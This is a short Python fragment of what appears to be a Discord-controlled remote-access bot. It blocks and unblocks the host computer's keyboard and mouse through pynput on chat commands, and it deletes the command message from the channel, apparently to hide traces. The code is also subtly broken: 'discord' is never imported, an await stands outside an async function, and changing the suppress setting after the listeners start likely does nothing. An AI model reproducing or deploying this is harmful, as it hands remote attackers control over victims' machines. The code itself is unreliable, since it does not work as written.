from pynput import keyboard, mouse

class Listeners:
    def __init__(self):
        self.is_blocked = False
        self.keyboard_listener = keyboard.Listener(suppress=self.is_blocked)
        self.mouse_listener = mouse.Listener(suppress=self.is_blocked)
        self.keyboard_listener.start()
        self.mouse_listener.start()

    def block(self):
        self.is_blocked = True
        self.keyboard_listener.suppress = True
        self.mouse_listener.suppress = True

    def unblock(self):
        self.is_blocked = False
        self.keyboard_listener.suppress = False
        self.mouse_listener.suppress = False

listeners = Listeners()

async def handle_block_unblock_input(message):
    title, content, colour = '', '', discord.Colour.red()
    await message.delete()  #.log Removed the message
    if message.content == '.block-input':
        if not listeners.is_blocked:
            listeners.block()  #.log Blocked input
            title, content, colour = "ğŸš« Input Blocked", 'Input has been blocked. Unblock it by using .unblock-input', discord.Colour.red()
        else:
            title, content, colour = "ğŸ”´ Hold on!", 'The input is already blocked. Unblock it by using .unblock-input', discord.Colour.red()

    elif message.content == '.unblock-input':
        if listeners.is_blocked:
            listeners.unblock()  #.log Unblocked input
            title, content, colour = "ğŸŸ¢ Input Unblocked", 'Input has been unblocked. Block it by using .block-input', discord.Colour.green()
        else:
            title, content, colour = "ğŸ”´ Hold on!", 'The input is not blocked. Block it by using .block-input', discord.Colour.red()

    embed = discord.Embed(title=title, description=f'```{content}```', colour=colour)
    return await message.channel.send(embed=embed)

# on message
if message.content in ['.block-input', '.unblock-input']:
    await handle_block_unblock_input(message)
